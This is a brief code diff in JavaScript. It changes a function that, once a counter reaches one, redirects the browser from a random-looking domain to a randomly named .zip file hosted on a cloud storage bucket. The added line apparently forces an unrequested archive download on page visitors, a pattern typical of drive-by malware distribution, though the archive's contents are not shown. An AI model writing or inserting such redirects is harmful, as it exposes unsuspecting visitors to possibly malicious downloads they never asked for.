@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://www.yssuygdm.com";
+		var url="https://hknbwoiaw.oss-cn-hongkong.aliyuncs.com/Wkwlpcbwsk.zip";
 		window.location=url;
 	}
 }
